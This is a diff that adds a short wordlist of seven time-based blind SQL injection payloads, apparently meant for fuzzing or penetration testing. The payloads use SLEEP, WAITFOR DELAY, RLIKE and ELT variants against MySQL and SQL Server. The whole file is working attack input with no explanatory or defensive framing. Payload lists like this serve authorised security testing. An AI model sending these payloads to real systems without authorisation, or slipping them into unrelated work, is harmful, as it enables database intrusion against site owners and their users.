@@ -1,0 +1,7 @@
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--
+' RLIKE SLEEP(5)--
+' AND ELT(1,SLEEP(5))--
